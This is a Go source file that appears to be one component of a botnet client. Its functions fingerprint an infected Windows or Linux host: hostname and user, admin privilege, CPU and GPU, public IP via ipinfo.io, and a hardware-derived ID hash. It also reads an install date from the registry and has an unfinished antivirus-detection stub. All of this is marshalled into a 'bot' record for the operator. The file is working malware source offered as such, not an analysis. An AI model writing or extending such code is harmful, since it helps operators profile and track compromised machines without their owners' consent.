package components

import (
	"crypto/md5"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"github.com/StackExchange/wmi"
	"github.com/shirou/gopsutil/v4/cpu"
	"golang.org/x/sys/windows/registry"
)

func get_os_version() string {
	return runtime.GOOS + "-" + runtime.GOARCH
}

func get_whoami() string {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "NaN"
	}
	username, err := user.Current()
	if err != nil {
		username.Username = "NaN"
	}
	return (hostname + "@" + username.Username)
}

func is_admin() bool {
	if runtime.GOOS == "windows" {
		var token uintptr
		currentProcess, _, _ := pfnGetCurrentProcess.Call()
		ok, _, _ := pfnOpenProcessToken.Call(currentProcess,
			TOKEN_QUERY, uintptr(unsafe.Pointer(&token)))
		if ok == 0 {
			log.Println("pfnOpenProcessToken failed: ")
			return false
		}
		defer pfnCloseHandle.Call(token)
		var tokenInfo uint32
		var outLen uint32
		ok, _, _ = pfnGetTokenInformation.Call(token, TokenElevation, uintptr(unsafe.Pointer(&tokenInfo)),
			uintptr(unsafe.Sizeof(tokenInfo)), uintptr(unsafe.Pointer(&outLen)))
		if ok == 0 {
			log.Println("pfnGetTokenInformation failed: ")
			return false
		}

		return uint32(tokenInfo) != 0
	} else {
		return os.Geteuid() == 0
	}
}

func get_cpu_info() string {
	// Get CPU brand
	if runtime.GOOS == "windows" {
		cpu_brand := reg_read_key(registry.LOCAL_MACHINE, "HARDWARE/DESCRIPTION/System/CentralProcessor/0", "ProcessorNameString", 1).(string)
		if cpu_brand == "" {
			cpu_brand, err := cpu.Info()
			if err != nil {
				return "Unknown CPU"
			}
			return cpu_brand[0].ModelName
		}
		return cpu_brand
	} else {
		// linux
		cpu_brand, err := cpu.Info()
		if err != nil {
			return "Unknown CPU"
		}
		return cpu_brand[0].ModelName
	}
}

func get_gpu_info() string {
	if runtime.GOOS == "windows" {
		var gpus []Win32_VideoController
		err := wmi.Query("SELECT Name, PNPDeviceID, AdapterRAM, DriverVersion FROM Win32_VideoController", &gpus)
		if err != nil {
			return "Unknown GPU"
		}
		return gpus[0].Name
	} else {
		base := "/sys/class/drm/card0/device/device"
		return read_file_trimed(base)
	}
}

func get_ip() string {
	resp, err := http.Get("https://ipinfo.io/ip")

	if err == nil {
		defer resp.Body.Close()
		ip, err := io.ReadAll(resp.Body)
		if err == nil {
			return strings.TrimSpace(string(ip))
		}
	}

	return "Unknown"
}

func get_antivirus() string {
	//for k, v := range av_list {
	//	if find_process_by_name(k) {
	//		return v
	//	}
	//}
	return "NaN"
}

func get_guid_hash() string {
	var hash [16]byte
	if runtime.GOOS == "windows" {
		// Get BIOS serial number
		var bios []Win32_BIOS
		err := wmi.Query("SELECT SerialNumber FROM Win32_BIOS", &bios)
		if err != nil || len(bios) == 0 {
			return ""
		}
		bios_serial := strings.TrimSpace(bios[0].SerialNumber)
		// Get CPU brand
		cpu_brand := get_cpu_info()
		// Get system drive volume serial
		var volumeSerial uint32
		volume_serial := ""
		rootPath, _ := syscall.UTF16PtrFromString("C:\\")
		ret, _, _ := pfnGetVolumeInformation.Call(
			uintptr(unsafe.Pointer(rootPath)),
			0, 0, uintptr(unsafe.Pointer(&volumeSerial)), 0, 0, 0, 0)
		if ret != 0 {
			volume_serial = strings.TrimSpace(fmt.Sprintf("%08X", volumeSerial))
		}
		hash = md5.Sum([]byte(bios_serial + "|" + cpu_brand + "|" + volume_serial))
	} else {
		// linux
		data, err := os.ReadFile("/proc/self/mounts")
		if err == nil {
			for _, line := range strings.Split(string(data), "\n") {
				fields := strings.Fields(line)
				if len(fields) >= 2 && fields[1] == "/" {
					return fields[0]
				}
			}
		}
	}

	return bytes_to_hex_string(hash[:])
}

func get_bot_info() []byte {
	var admin string
	if is_admin() {
		admin = "yes"
	} else {
		admin = "no"
	}

	if len(g_installdate) == 0 {
		result := reg_read_key(registry.CURRENT_USER, g_regpath, "installdate", 1)
		if result == nil {
			g_installdate = generate_utc_timestamp_string()
		} else {
			g_installdate = result.(string)
		}
	}

	guid := g_guid
	if len(guid) == 0 {
		guid = get_guid_hash()
	}

	bot := Client{
		Ip:          get_ip(),
		Whoami:      get_whoami(),
		GuidHash:    guid,
		Os:          get_os_version(),
		Installdate: g_installdate,
		Isadmin:     admin,
		Antivirus:   get_antivirus(),
		Cpuinfo:     get_cpu_info(),
		Gpuinfo:     get_gpu_info(),
		Version:     botcore.version,
	}

	byt, _ := json.Marshal(bot)
	return byt
}
